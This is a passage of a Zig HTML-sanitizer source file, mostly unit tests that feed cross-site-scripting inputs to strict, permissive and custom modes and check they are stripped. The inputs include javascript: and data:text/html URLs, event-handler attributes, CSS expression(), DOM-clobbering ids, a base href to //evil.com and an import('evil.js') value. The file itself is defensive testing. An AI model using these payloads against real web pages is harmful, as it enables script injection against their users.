        sanitizeCollectorCB,
        &context,
    );

    try sanitizePostWalkOperationsWithCss(
        allocator,
        &context,
        sanitizer_options,
        css_sanitizer,
    );
}

/// [sanitize] Sanitize DOM tree with specified options
///
/// Alias for sanitizeWithMode for backward compatibility.
pub fn sanitizeNode(allocator: std.mem.Allocator, root_node: *z.DomNode, mode: SanitizerMode) (std.mem.Allocator.Error || z.Err)!void {
    return sanitizeWithMode(allocator, root_node, mode);
}

// Convenience functions for common sanitization scenarios

/// [sanitize] Sanitize DOM tree with strict security settings
///
/// Removes scripts, styles, comments, dangerous URIs, and disallows custom elements.
pub fn sanitizeStrict(allocator: std.mem.Allocator, root_node: *z.DomNode) (std.mem.Allocator.Error || z.Err)!void {
    return sanitizeWithMode(allocator, root_node, .strict);
}

/// [sanitize] Sanitize DOM tree with permissive settings for modern web apps
///
/// Removes dangerous content but allows custom elements and framework attributes.
pub fn sanitizePermissive(allocator: std.mem.Allocator, root_node: *z.DomNode) (std.mem.Allocator.Error || z.Err)!void {
    return sanitizeWithMode(allocator, root_node, .permissive);
}

// ======================

test "removes script tags" {
    const allocator = testing.allocator;
    const html = "<script>alert('xss')</script><p>Safe text</p>";

    const doc = try z.parseHTML(allocator, html);
    defer z.destroyDocument(doc);
    const body = z.bodyNode(doc).?;

    try sanitizeStrict(allocator, body);
    const result = try z.innerHTML(allocator, z.bodyElement(doc).?);
    defer allocator.free(result);

    try testing.expectEqualStrings("<p>Safe text</p>", result);
}

test "removes event handlers" {
    const allocator = testing.allocator;
    const html =
        \\<div onclick="alert('xss')" onmouseover="steal()">
        \\  <p onload="evil()">Text</p>
        \\  <a href="#" onfocus="attack()">Link</a>
        \\</div>
    ;

    const doc = try z.parseHTML(allocator, html);
    defer z.destroyDocument(doc);

    try sanitizeStrict(allocator, z.bodyNode(doc).?);
    const result = try z.innerHTML(allocator, z.bodyElement(doc).?);
    defer allocator.free(result);

    // Should remove all on* attributes but keep elements
    try testing.expect(std.mem.indexOf(u8, result, "onclick") == null);
    try testing.expect(std.mem.indexOf(u8, result, "onmouseover") == null);
    try testing.expect(std.mem.indexOf(u8, result, "onload") == null);
    try testing.expect(std.mem.indexOf(u8, result, "onfocus") == null);
    try testing.expect(std.mem.indexOf(u8, result, "<div") != null);
    try testing.expect(std.mem.indexOf(u8, result, "<p") != null);
    try testing.expect(std.mem.indexOf(u8, result, "<a") != null);
}

test "blocks javascript: URLs" {
    const allocator = testing.allocator;
    const html =
        \\<a href="javascript:alert('xss')">Bad link 1</a>
        \\<a href="JAVASCRIPT:alert(1)">Bad link 2</a>
        \\<a href="java\u0000script:alert(1)">Bad link 3</a>
        \\<a href="https://example.com">Good link</a>
        \\<img src="javascript:evil()" alt="bad">
        \\<iframe src="javascript:attack()"></iframe>
    ;

    const doc = try z.parseHTML(allocator, html);
    defer z.destroyDocument(doc);

    try sanitizeStrict(allocator, z.bodyNode(doc).?);
    const result = try z.innerHTML(allocator, z.bodyElement(doc).?);
    defer allocator.free(result);

    // javascript: URLs should be removed or made empty
    try testing.expect(std.mem.indexOf(u8, result, "javascript:") == null);
    try testing.expect(std.mem.indexOf(u8, result, "JAVASCRIPT:") == null);
    try testing.expect(std.mem.indexOf(u8, result, "https://example.com") != null);
}

test "blocks dangerous data: URLs" {
    const allocator = testing.allocator;
    const html =
        \\<img src="data:text/html,<script>alert('xss')</script>" alt="bad">
        \\<a href="data:text/javascript,alert(1)">Bad</a>
        \\<img src="data:image/png,base64,..." alt="good png">
        \\<img src="data:image/svg+xml,<svg>...</svg>" alt="bad svg">
    ;

    const doc = try z.parseHTML(allocator, html);
    defer z.destroyDocument(doc);

    try sanitizeStrict(allocator, z.bodyNode(doc).?);
    const result = try z.innerHTML(allocator, z.bodyElement(doc).?);
    defer allocator.free(result);

    // Should block text/html and text/javascript data URLs
    try testing.expect(std.mem.indexOf(u8, result, "data:text/html") == null);
    try testing.expect(std.mem.indexOf(u8, result, "data:text/javascript") == null);
    try testing.expect(std.mem.indexOf(u8, result, "data:image/svg") == null);
    // Should allow image/png
    try testing.expect(std.mem.indexOf(u8, result, "data:image/png") != null or
        std.mem.indexOf(u8, result, "data:image/") != null);
}

test "removes style tags and dangerous inline styles" {
    const allocator = testing.allocator;
    const html =
        \\<style>body { background: url(javascript:alert('xss')); }</style>
        \\<div style="background: expression(alert('xss'))">Div 1</div>
        \\<div style="color: red; background: url(http://example.com)">Div 2</div>
        \\<div style="behavior: url(#default#something)">Div 3</div>
        \\<div style="color: red;"</div>
    ;

    const doc = try z.parseHTML(allocator, html);
    defer z.destroyDocument(doc);

    try sanitizePermissive(allocator, z.bodyNode(doc).?);
    const result = try z.innerHTML(allocator, z.bodyElement(doc).?);
    defer allocator.free(result);

    // Should remove style tag and dangerous styles
    try testing.expect(std.mem.indexOf(u8, result, "<style>") == null);
    try testing.expect(std.mem.indexOf(u8, result, "expression") == null);
    try testing.expect(std.mem.indexOf(u8, result, "behavior") == null);
    try testing.expect(std.mem.indexOf(u8, result, "javascript:") == null);
    try testing.expect(std.mem.indexOf(u8, result, "color: red") == null);
}

test "handles nested dangerous elements" {
    const allocator = testing.allocator;
    const html =
        \\<div onclick="alert('outer')">
        \\  <p onmouseover="alert('inner')">
        \\    <script>alert('deep')</script>
        \\    <span>Safe text</span>
        \\  </p>
        \\</div>
    ;

    const doc = try z.parseHTML(allocator, html);
    defer z.destroyDocument(doc);

    try sanitizeStrict(allocator, z.bodyNode(doc).?);
    const result = try z.innerHTML(allocator, z.bodyElement(doc).?);
    defer allocator.free(result);

    // Should remove all dangerous content but keep structure and safe text
    try testing.expect(std.mem.indexOf(u8, result, "onclick") == null);
    try testing.expect(std.mem.indexOf(u8, result, "onmouseover") == null);
    try testing.expect(std.mem.indexOf(u8, result, "<script>") == null);
    try testing.expect(std.mem.indexOf(u8, result, "Safe text") != null);
    try testing.expect(std.mem.indexOf(u8, result, "<div>") != null);
    try testing.expect(std.mem.indexOf(u8, result, "<p>") != null);
    try testing.expect(std.mem.indexOf(u8, result, "<span>") != null);
}

test "allows HTMX attributes in permissive mode" {
    const allocator = testing.allocator;
    const html =
        \\<div hx-get="/api/data" hx-trigger="click" hx-target="#result">
        \\  Click me
        \\</div>
        \\<button hx-post="/submit" hx-swap="outerHTML">Submit</button>
    ;

    const doc = try z.parseHTML(allocator, html);
    defer z.destroyDocument(doc);

    try sanitizePermissive(allocator, z.bodyNode(doc).?);
    const result = try z.innerHTML(allocator, z.bodyElement(doc).?);
    defer allocator.free(result);

    // Should preserve HTMX attributes
    try testing.expect(std.mem.indexOf(u8, result, "hx-get") != null);
    try testing.expect(std.mem.indexOf(u8, result, "hx-post") != null);
    try testing.expect(std.mem.indexOf(u8, result, "hx-trigger") != null);
    try testing.expect(std.mem.indexOf(u8, result, "hx-target") != null);
    try testing.expect(std.mem.indexOf(u8, result, "hx-swap") != null);
}

test "allows Alpine.js attributes" {
    const allocator = testing.allocator;
    const html =
        \\<div x-data="{ open: false }" x-show="open" @click="open = !open">
        \\  <button x-on:click="submit()">Submit</button>
        \\  <input x-model="search" type="text">
        \\</div>
    ;

    const doc = try z.parseHTML(allocator, html);
    defer z.destroyDocument(doc);

    try sanitizePermissive(allocator, z.bodyNode(doc).?);
    const result = try z.innerHTML(allocator, z.bodyElement(doc).?);
    defer allocator.free(result);

    // Should preserve Alpine attributes
    try testing.expect(std.mem.indexOf(u8, result, "x-data") != null);
    try testing.expect(std.mem.indexOf(u8, result, "x-show") != null);
    try testing.expect(std.mem.indexOf(u8, result, "@click") != null);
    try testing.expect(std.mem.indexOf(u8, result, "x-on:click") != null);
    try testing.expect(std.mem.indexOf(u8, result, "x-model") != null);
}

test "allows Vue.js attributes" {
    const allocator = testing.allocator;
    const html =
        \\<div v-if="show" v-for="item in items" :key="item.id">
        \\  <span v-text="item.name"></span>
        \\  <button @click="remove(item)">Remove</button>
        \\  <input v-model="item.value">
        \\</div>
    ;

    const doc = try z.parseHTML(allocator, html);
    defer z.destroyDocument(doc);

    try sanitizePermissive(allocator, z.bodyNode(doc).?);
    const result = try z.innerHTML(allocator, z.bodyElement(doc).?);
    defer allocator.free(result);

    // Should preserve Vue attributes
    try testing.expect(std.mem.indexOf(u8, result, "v-if") != null);
    try testing.expect(std.mem.indexOf(u8, result, "v-for") != null);
    try testing.expect(std.mem.indexOf(u8, result, ":key") != null);
    try testing.expect(std.mem.indexOf(u8, result, "v-text") != null);
    try testing.expect(std.mem.indexOf(u8, result, "@click") != null);
    try testing.expect(std.mem.indexOf(u8, result, "v-model") != null);
}

test "allows Phoenix LiveView attributes" {
    const allocator = testing.allocator;
    const html =
        \\<div phx-click="update" phx-value-id="123" phx-target="#content">
        \\  <form phx-submit="save" phx-change="validate">
        \\    <input phx-debounce="300" name="email">
        \\  </form>
        \\</div>
    ;

    const doc = try z.parseHTML(allocator, html);
    defer z.destroyDocument(doc);

    try sanitizePermissive(allocator, z.bodyNode(doc).?);
    const result = try z.innerHTML(allocator, z.bodyElement(doc).?);
    defer allocator.free(result);

    // Should preserve Phoenix attributes
    try testing.expect(std.mem.indexOf(u8, result, "phx-click") != null);
    try testing.expect(std.mem.indexOf(u8, result, "phx-value-id") != null);
    try testing.expect(std.mem.indexOf(u8, result, "phx-target") != null);
    try testing.expect(std.mem.indexOf(u8, result, "phx-submit") != null);
    try testing.expect(std.mem.indexOf(u8, result, "phx-change") != null);
    try testing.expect(std.mem.indexOf(u8, result, "phx-debounce") != null);
}

test "blocks dangerous values in framework attributes" {
    const allocator = testing.allocator;
    const html =
        \\<div x-data="javascript:alert('xss')">Bad Alpine</div>
        \\<button phx-click="import('evil.js')">Bad Phoenix</button>
        \\<a :href="javascript:attack()">Bad Vue</a>
        \\<div hx-get="data:text/html,<script>alert(1)</script>">Bad HTMX</div>
    ;

    const doc = try z.parseHTML(allocator, html);
    defer z.destroyDocument(doc);

    try sanitizePermissive(allocator, z.bodyNode(doc).?);
    const result = try z.innerHTML(allocator, z.bodyElement(doc).?);
    defer allocator.free(result);

    // Should remove attributes with dangerous values
    try testing.expect(std.mem.indexOf(u8, result, "javascript:") == null);
    try testing.expect(std.mem.indexOf(u8, result, "import(") == null);
    try testing.expect(std.mem.indexOf(u8, result, "data:text/html") == null);
}

test "removes framework attributes in strict mode" {
    const allocator = testing.allocator;
    const html = "<div hx-get='/api' x-data='{}' v-if='true'>Content</div>";

    const doc = try z.parseHTML(allocator, html);
    defer z.destroyDocument(doc);

    try sanitizeStrict(allocator, z.bodyNode(doc).?);
    const result = try z.innerHTML(allocator, z.bodyElement(doc).?);
    defer allocator.free(result);

    // Should remove framework attributes in strict mode
    try testing.expect(std.mem.indexOf(u8, result, "hx-get") == null);
    try testing.expect(std.mem.indexOf(u8, result, "x-data") == null);
    try testing.expect(std.mem.indexOf(u8, result, "v-if") == null);
    try testing.expect(std.mem.indexOf(u8, result, "<div") != null);
    try testing.expect(std.mem.indexOf(u8, result, "Content") != null);
}

test "allows custom elements in permissive mode" {
    const allocator = testing.allocator;
    const html =
        \\<my-button class="btn" style="color: red">Click me</my-button>
        \\<user-profile data-user-id="123" aria-label="User">
        \\  <avatar-image src="/avatar.jpg"></avatar-image>
        \\</user-profile>
        \\<date-picker min="2024-01-01" max="2024-12-31"></date-picker>
    ;

    const doc = try z.parseHTML(allocator, html);
    defer z.destroyDocument(doc);

    try sanitizePermissive(allocator, z.bodyNode(doc).?);
    const result = try z.innerHTML(allocator, z.bodyElement(doc).?);
    defer allocator.free(result);

    // Should preserve custom elements and their safe attributes
    try testing.expect(std.mem.indexOf(u8, result, "my-button") != null);
    try testing.expect(std.mem.indexOf(u8, result, "user-profile") != null);
    try testing.expect(std.mem.indexOf(u8, result, "avatar-image") != null);
    try testing.expect(std.mem.indexOf(u8, result, "date-picker") != null);
    try testing.expect(std.mem.indexOf(u8, result, "class=\"btn\"") != null);
    try testing.expect(std.mem.indexOf(u8, result, "data-user-id") != null);
    try testing.expect(std.mem.indexOf(u8, result, "aria-label") != null);
}

test "removes custom elements in strict mode" {
    const allocator = testing.allocator;
    const html =
        \\<div>Before</div>
        \\<custom-element>Content</custom-element>
        \\<another-custom data-test="value"></another-custom>
        \\<div>After</div>
    ;

    const doc = try z.parseHTML(allocator, html);
    defer z.destroyDocument(doc);

    try sanitizeStrict(allocator, z.bodyNode(doc).?);
    const result = try z.innerHTML(allocator, z.bodyElement(doc).?);
    defer allocator.free(result);

    // Should remove custom elements in strict mode
    try testing.expect(std.mem.indexOf(u8, result, "custom-element") == null);
    try testing.expect(std.mem.indexOf(u8, result, "another-custom") == null);
    try testing.expect(std.mem.indexOf(u8, result, "Before") != null);
    try testing.expect(std.mem.indexOf(u8, result, "After") != null);
}

test "sanitizes attributes on custom elements" {
    const allocator = testing.allocator;
    const html =
        \\<my-component
        \\  onclick="alert('xss')"
        \\  style="background: url(javascript:evil())"
        \\  href="javascript:attack()"
        \\  safe-attr="value"
        \\  class="component"
        \\>Content</my-component>
    ;

    const doc = try z.parseHTML(allocator, html);
    defer z.destroyDocument(doc);

    try sanitizePermissive(allocator, z.bodyNode(doc).?);
    const result = try z.innerHTML(allocator, z.bodyElement(doc).?);
    defer allocator.free(result);

    // Should remove dangerous attributes from custom elements
    try testing.expect(std.mem.indexOf(u8, result, "onclick") == null);
    try testing.expect(std.mem.indexOf(u8, result, "javascript:") == null);
    // Should keep safe attributes
    try testing.expect(std.mem.indexOf(u8, result, "safe-attr") == null);
    try testing.expect(std.mem.indexOf(u8, result, "class=\"component\"") != null);
    try testing.expect(std.mem.indexOf(u8, result, "my-component") != null);
}

test "handles nested templates in custom elements" {
    const allocator = testing.allocator;
    const html =
        \\<my-component>
        \\  <template>
        \\    <script>alert('xss')</script>
        \\    <div>Template content</div>
        \\  </template>
        \\  <div>Regular content</div>
        \\</my-component>
    ;

    const doc = try z.parseHTML(allocator, html);
    defer z.destroyDocument(doc);

    try sanitizePermissive(allocator, z.bodyNode(doc).?);
    const result = try z.innerHTML(allocator, z.bodyElement(doc).?);
    defer allocator.free(result);

    // Should sanitize template content inside custom elements
    try testing.expect(std.mem.indexOf(u8, result, "<template>") != null);
    try testing.expect(std.mem.indexOf(u8, result, "Template content") != null);
    try testing.expect(std.mem.indexOf(u8, result, "Regular content") != null);
    try testing.expect(std.mem.indexOf(u8, result, "<script>") == null);
}

test "preserves data- and aria- attributes on custom elements" {
    const allocator = testing.allocator;
    const html =
        \\<custom-element
        \\  data-config='{"key": "value"}'
        \\  aria-labelledby="label1"
        \\  aria-describedby="desc1"
        \\  data-test-id="test-123"
        \\>Content</custom-element>
    ;

    const doc = try z.parseHTML(allocator, html);
    defer z.destroyDocument(doc);

    try sanitizePermissive(allocator, z.bodyNode(doc).?);
    const result = try z.innerHTML(allocator, z.bodyElement(doc).?);
    defer allocator.free(result);

    // Should preserve data-* and aria-* attributes
    try testing.expect(std.mem.indexOf(u8, result, "data-config") != null);
    try testing.expect(std.mem.indexOf(u8, result, "data-test-id") != null);
    try testing.expect(std.mem.indexOf(u8, result, "aria-labelledby") != null);
    try testing.expect(std.mem.indexOf(u8, result, "aria-describedby") != null);
}

// TODO
// test "understand parser behavior" {
//     const allocator = testing.allocator;

//     // Test 1: Full document
//     const full_doc =
//         \\<!DOCTYPE html>
//         \\<html>
//         \\<head>
//         \\  <script>head script</script>
//         \\</head>
//         \\<body>
//         \\  <div>body content</div>
//         \\</body>
//         \\</html>
//     ;

//     // Test 2: Fragment (no doctype/html/head/body)
//     const fragment =
//         \\<script>standalone script</script>
//         \\<div>standalone div</div>
//     ;

//     const doc1 = try z.parseHTML(allocator, full_doc);
//     defer z.destroyDocument(doc1);

//     const doc2 = try z.parseHTML(allocator, fragment);
//     defer z.destroyDocument(doc2);

//     // Check what elements exist where
//     const head1 = z.headElement(doc1);
//     const body1 = z.bodyElement(doc1);
//     const head2 = z.headElement(doc2); // Might be null!
//     const body2 = z.bodyElement(doc2);

//     std.debug.print("Full doc - head exists: {}, body exists: {}\n", .{ head1 != null, body1 != null });

//     std.debug.print("Fragment - head exists: {}, body exists: {}\n", .{ head2 != null, body2 != null });

//     // Print structure
//     if (body2) |b| {
//         const body_html = try z.innerHTML(allocator, b);
//         defer allocator.free(body_html);
//         std.debug.print("Fragment body content: {s}\n", .{body_html});
//     }
// }

test "minimum mode preserves scripts but removes dangerous attributes" {
    const allocator = testing.allocator;
    const html =
        \\<body>
        \\<script>console.log('safe')</script>
        \\<div onclick="alert('xss')">Click me</div>
        \\<style>body { color: red; }</style>
        \\<!-- Comment -->
        \\<custom-element>Test</custom-element>
        \\</body>
    ;

    const doc = try z.parseHTML(allocator, html);
    defer z.destroyDocument(doc);

    try sanitizeWithMode(allocator, z.bodyNode(doc).?, .minimum);
    const result = try z.innerHTML(allocator, z.bodyElement(doc).?);
    defer allocator.free(result);
    // try z.prettyPrint(allocator, z.bodyNode(doc).?);

    // Minimum mode: keeps scripts, styles, comments, custom elements
    try testing.expect(std.mem.indexOf(u8, result, "<script>") != null);
    try testing.expect(std.mem.indexOf(u8, result, "<style>") != null);
    try testing.expect(std.mem.indexOf(u8, result, "Comment") != null);
    try testing.expect(std.mem.indexOf(u8, result, "custom-element") != null);
    // But removes dangerous attributes
    try testing.expect(std.mem.indexOf(u8, result, "onclick") == null);
}

test "strict mode removes all dangerous content" {
    const allocator = testing.allocator;
    const html =
        \\<script>alert('xss')</script>
        \\<style>body { background: red; }</style>
        \\<!-- Secret comment -->
        \\<custom-element>Custom</custom-element>
        \\<div hx-get="/api">HTMX</div>
        \\<p onclick="alert()">Text</p>
        \\<a href="javascript:alert()">Link</a>
    ;

    const doc = try z.parseHTML(allocator, html);
    defer z.destroyDocument(doc);

    try sanitizeStrict(allocator, z.bodyNode(doc).?);
    const result = try z.innerHTML(allocator, z.bodyElement(doc).?);
    defer allocator.free(result);

    // Strict mode: removes everything dangerous
    try testing.expect(std.mem.indexOf(u8, result, "<script>") == null);
    try testing.expect(std.mem.indexOf(u8, result, "<style>") == null);
    try testing.expect(std.mem.indexOf(u8, result, "Comment") == null);
    try testing.expect(std.mem.indexOf(u8, result, "custom-element") == null);
    try testing.expect(std.mem.indexOf(u8, result, "hx-get") == null);
    try testing.expect(std.mem.indexOf(u8, result, "onclick") == null);
    try testing.expect(std.mem.indexOf(u8, result, "javascript:") == null);
    // Keeps safe content
    try testing.expect(std.mem.indexOf(u8, result, "Text") != null);
    try testing.expect(std.mem.indexOf(u8, result, "Link") != null);
}

test "permissive mode allows frameworks and custom elements" {
    const allocator = testing.allocator;
    const html =
        \\<script>alert('removed')</script>
        \\<style>body { color: red; }</style>
        \\<custom-element hx-get="/api" x-data="{}">Content</custom-element>
        \\<div onclick="alert('removed')" phx-click="update">Button</div>
        \\<!-- Comment removed -->
    ;

    const doc = try z.parseHTML(allocator, html);
    defer z.destroyDocument(doc);

    try sanitizePermissive(allocator, z.bodyNode(doc).?);
    const result = try z.innerHTML(allocator, z.bodyElement(doc).?);
    defer allocator.free(result);

    // Permissive: removes scripts, styles, comments, traditional event handlers
    try testing.expect(std.mem.indexOf(u8, result, "<script>") == null);
    try testing.expect(std.mem.indexOf(u8, result, "<style>") == null);
    try testing.expect(std.mem.indexOf(u8, result, "Comment") == null);
    try testing.expect(std.mem.indexOf(u8, result, "onclick") == null);

    // But allows custom elements and framework attributes
    try testing.expect(std.mem.indexOf(u8, result, "custom-element") != null);
    try testing.expect(std.mem.indexOf(u8, result, "hx-get") != null);
    try testing.expect(std.mem.indexOf(u8, result, "x-data") != null);
    try testing.expect(std.mem.indexOf(u8, result, "phx-click") != null);
    try testing.expect(std.mem.indexOf(u8, result, "Content") != null);
    try testing.expect(std.mem.indexOf(u8, result, "Button") != null);
}

test "DOM clobbering protection" {
    const allocator = testing.allocator;
    const html =
        \\<body>
        \\<img id="location" src="x.png">
        \\<form id="document"><input name="cookie"></form>
        \\<a id="createElement">Link</a>
        \\<div id="safe-id">Safe</div>
        \\<input name="safe-name">
        \\</body>
    ;

    const doc = try z.parseHTML(allocator, html);
    defer z.destroyDocument(doc);

    // Strict mode has DOM clobbering protection enabled
    try sanitizeStrict(allocator, z.bodyNode(doc).?);
    const result = try z.innerHTML(allocator, z.bodyElement(doc).?);
    defer allocator.free(result);

    // Dangerous id/name values should be removed
    try testing.expect(std.mem.indexOf(u8, result, "id=\"location\"") == null);
    try testing.expect(std.mem.indexOf(u8, result, "id=\"document\"") == null);
    try testing.expect(std.mem.indexOf(u8, result, "name=\"cookie\"") == null);
    try testing.expect(std.mem.indexOf(u8, result, "id=\"createElement\"") == null);

    // Safe id/name values should remain
    try testing.expect(std.mem.indexOf(u8, result, "id=\"safe-id\"") != null);
    try testing.expect(std.mem.indexOf(u8, result, "name=\"safe-name\"") != null);

    // Elements themselves should remain (just attributes removed)
    try testing.expect(std.mem.indexOf(u8, result, "<img") != null);
    try testing.expect(std.mem.indexOf(u8, result, "<form") != null);
    try testing.expect(std.mem.indexOf(u8, result, "Safe") != null);
}

test "DOM clobbering disabled in minimum mode" {
    const allocator = testing.allocator;
    const html =
        \\<body>
        \\<img id="location" src="x.png">
        \\</body>
    ;

    const doc = try z.parseHTML(allocator, html);
    defer z.destroyDocument(doc);

    // Minimum mode has DOM clobbering protection disabled
    try sanitizeWithMode(allocator, z.bodyNode(doc).?, .minimum);
    const result = try z.innerHTML(allocator, z.bodyElement(doc).?);
    defer allocator.free(result);

    // In minimum mode, the id="location" should remain (clobbering protection disabled)
    try testing.expect(std.mem.indexOf(u8, result, "id=\"location\"") != null);
}

test "custom mode with specific options" {
    const allocator = testing.allocator;
    const html =
        \\<body>
        \\<script>console.log('test')</script>
        \\<style>body { color: blue; }</style>
        \\<!-- Keep this comment -->
        \\<custom-element>Test</custom-element>
        \\<div onclick="alert()">Click</div>
        \\<a href="javascript:alert()">Bad</a>
        \\</body>
    ;

    const doc = try z.parseHTML(allocator, html);
    defer z.destroyDocument(doc);

    try sanitizeWithMode(allocator, z.bodyNode(doc).?, .{
        .custom = SanitizerOptions{
            .skip_comments = false, // Keep comments
            .remove_scripts = false, // Keep scripts
            .remove_styles = true, // Remove styles
            .strict_uri_validation = true, // Block javascript: URLs
            .allow_custom_elements = true, // Allow custom elements
        },
    });

    const result = try z.innerHTML(allocator, z.bodyElement(doc).?);
    defer allocator.free(result);

    // According to custom options:
    try testing.expect(std.mem.indexOf(u8, result, "<script>") != null); // Kept
    try testing.expect(std.mem.indexOf(u8, result, "<style>") == null); // Removed
    try testing.expect(std.mem.indexOf(u8, result, "comment") != null); // Kept
    try testing.expect(std.mem.indexOf(u8, result, "custom-element") != null); // Kept
    try testing.expect(std.mem.indexOf(u8, result, "onclick") == null); // Removed (dangerous)
    try testing.expect(std.mem.indexOf(u8, result, "javascript:") == null); // Blocked
}

test "none mode does nothing" {
    const allocator = testing.allocator;
    const original_html =
        \\<body>
        \\<script>alert('xss')</script>
        \\<div onclick="evil()">Click</div>
        \\<!-- Comment -->
        \\</body>
    ;

    const doc = try z.parseHTML(allocator, original_html);
    defer z.destroyDocument(doc);

    // .none mode should do absolutely nothing
    try sanitizeWithMode(allocator, z.bodyNode(doc).?, .none);

    const result = try z.innerHTML(allocator, z.bodyElement(doc).?);
    defer allocator.free(result);

    // Everything should remain unchanged
    try testing.expect(std.mem.indexOf(u8, result, "<script>") != null);
    try testing.expect(std.mem.indexOf(u8, result, "onclick") != null);
    try testing.expect(std.mem.indexOf(u8, result, "Comment") != null);
}

// a standalone <scriptx is place in the <head>, unless placed in the <body>
test "mode consistency across similar inputs" {
    const allocator = testing.allocator;

    const test_cases = [_]struct {
        html: []const u8,
        mode: SanitizerMode,
        should_contain: []const []const u8,
        should_not_contain: []const []const u8,
    }{
        .{
            // lexbor parses <script> into HEAD unless set into BODY
            .html = "<script>alert(1)</script><body><p>First Text</p><script>alert(2);</script></body>",
            .mode = .strict,
            .should_contain = &[_][]const u8{"<p>First Text</p>"},
            .should_not_contain = &[_][]const u8{"<script>"},
        },
        .{
            .html = "<script>alert(1)</script><body><p>Second Text</p><script>alert(2);</script></body>",
            .mode = .minimum,
            .should_contain = &[_][]const u8{ "<script>", "<p>Second Text</p>" },
            .should_not_contain = &[_][]const u8{},
        },
        .{
            // lexbor parses into BODY
            .html = "<custom-elem>Test</custom-elem>",
            .mode = .strict,
            .should_contain = &[_][]const u8{},
            .should_not_contain = &[_][]const u8{"custom-elem"},
        },
        .{
            .html = "<custom-elem>Test</custom-elem>",
            .mode = .permissive,
            .should_contain = &[_][]const u8{ "custom-elem", "Test" },
            .should_not_contain = &[_][]const u8{},
        },
    };

    for (test_cases) |case| {
        const doc = try z.parseHTML(allocator, case.html);

        try sanitizeWithMode(allocator, z.bodyNode(doc).?, case.mode);
        const result = try z.innerHTML(allocator, z.bodyElement(doc).?);
        defer allocator.free(result);

        for (case.should_contain) |expected| {
            try testing.expect(std.mem.indexOf(u8, result, expected) != null);
        }

        for (case.should_not_contain) |not_expected| {
            try testing.expect(std.mem.indexOf(u8, result, not_expected) == null);
        }
        z.destroyDocument(doc);
    }
}

test "iframe requires sandbox attribute" {
    const allocator = testing.allocator;
    const html =
        \\<body>
        \\<iframe src="https://example.com">No sandbox</iframe>
        \\<iframe sandbox src="https://safe.com">With sandbox</iframe>
        \\<iframe sandbox="allow-scripts" src="/page.html">Dangerous sandbox</iframe>
        \\<iframe sandbox src="javascript:alert()">Bad URL</iframe>
        \\</body>
    ;

    const doc = try z.parseHTML(allocator, html);
    defer z.destroyDocument(doc);

    try sanitizeStrict(allocator, z.bodyNode(doc).?);
    const result = try z.innerHTML(allocator, z.bodyElement(doc).?);
    defer allocator.free(result);

    // Only safe iframes should remain
    try testing.expect(std.mem.indexOf(u8, result, "No sandbox") == null);
    try testing.expect(std.mem.indexOf(u8, result, "allow-scripts") == null);
    try testing.expect(std.mem.indexOf(u8, result, "javascript:") == null);
    try testing.expect(std.mem.indexOf(u8, result, "With sandbox") != null);
    try testing.expect(std.mem.indexOf(u8, result, "sandbox") != null);
}

test "meta tag validation" {
    const allocator = testing.allocator;
    const html =
        \\<body>
        \\<meta http-equiv="refresh" content="5;url=https://example.com">
        \\<meta http-equiv="set-cookie" content="session=abc">
        \\<meta charset="UTF-8">
        \\<meta charset="windows-1252">
        \\<meta name="viewport" content="width=device-width">
        \\<meta http-equiv="content-security-policy" content="default-src 'self'">
        \\</body>
    ;

    const doc = try z.parseHTML(allocator, html);
    defer z.destroyDocument(doc);

    try sanitizeStrict(allocator, z.bodyNode(doc).?);
    const result = try z.innerHTML(allocator, z.bodyElement(doc).?);
    defer allocator.free(result);

    // Should block dangerous meta tags
    try testing.expect(std.mem.indexOf(u8, result, "refresh") == null);
    try testing.expect(std.mem.indexOf(u8, result, "set-cookie") == null);
    try testing.expect(std.mem.indexOf(u8, result, "windows-1252") == null);
    try testing.expect(std.mem.indexOf(u8, result, "content-security-policy") == null);
    // Should allow safe ones
    try testing.expect(std.mem.indexOf(u8, result, "UTF-8") != null);
    try testing.expect(std.mem.indexOf(u8, result, "viewport") != null);
}

test "base tag restrictions" {
    const allocator = testing.allocator;
    const html =
        \\<body>
        \\<base href="https://example.com/">
        \\<base href="/relative/path">
        \\<base href="javascript:alert()">
        \\<base href="data:text/html,<script>alert()</scriptx>">
        \\<base href="//evil.com">
        \\<base href="../../../etc/passwd">
        \\</body>
    ;

    const doc = try z.parseHTML(allocator, html);
    defer z.destroyDocument(doc);

    try sanitizeStrict(allocator, z.bodyNode(doc).?);

    const result = z.firstElementChild(z.bodyNode(doc).?);
    if (result) |_| {
        try std.testing.expect(false);
    } else {
        try testing.expect(result == null);
    }
}

test "base tag allowed in permissive mode with safe URLs" {
    const allocator = testing.allocator;
    const html =
        \\<body>
        \\<base href="https://example.com/">
        \\<base href="/safe/path">
        \\<base href="javascript:alert()">
        \\<base href="http://example.org">
        \\</body>
    ;

    const doc = try z.parseHTML(allocator, html);
    defer z.destroyDocument(doc);

    try sanitizePermissive(allocator, z.bodyNode(doc).?);

    const result = try z.innerHTML(allocator, z.bodyElement(doc).?);
    defer allocator.free(result);

    // // Should keep safe base tags, remove dangerous ones
    try testing.expect(std.mem.indexOf(u8, result, "https://example.com") != null);
    try testing.expect(std.mem.indexOf(u8, result, "/safe/path") != null);
    try testing.expect(std.mem.indexOf(u8, result, "http://example.org") != null);
    try testing.expect(std.mem.indexOf(u8, result, "javascript:") == null);
}

test "check embed in system" {
    const allocator = testing.allocator;
    const html = "<body><embed src=\"test.png\"></body>";

    const doc = try z.parseHTML(allocator, html);
    defer z.destroyDocument(doc);

    const embed = try z.querySelector(allocator, doc, "embed");
    try testing.expect(embed != null);
    // if (embed) |e| {
    // const tag = z.tagFromAnyElement(e);
    // std.debug.print("Embed tag enum: {s}\n", .{@tagName(tag)});

    // const tag_name = z.qualifiedName_zc(e);
    // std.debug.print("Embed tag name: '{s}'\n", .{tag_name});

    // Check if there's a spec
    // const spec = z.getElementSpecByEnum(tag);
    // std.debug.print("Has spec: {}\n", .{spec != null});
    // }
}

test "object and embed safety validation" {
    const allocator = testing.allocator;
    const html =
        \\<body>
        \\<object data="https://example.com/document.pdf" type="application/pdf">PDF</object>
        \\<object data="https://example.com/video.mp4" type="video/mp4">Video</object>
        \\<object data="javascript:alert()">Bad</object>
        \\<embed src="https://example.com/image.png" type="image/png">
        \\<embed src="data:text/html,<script>alert()</script>">
        \\<object type="application/x-shockwave-flash" data="game.swf">Flash</object>
        \\</body>
    ;

    const doc = try z.parseHTML(allocator, html);
    defer z.destroyDocument(doc);

    // Use custom mode that allows embeds (allow_embeds=true enables validation)
    try sanitizeWithMode(allocator, z.bodyNode(doc).?, .{
        .custom = SanitizerOptions{
            .skip_comments = true,
            .remove_scripts = true,
            .remove_styles = true,
            .strict_uri_validation = false,
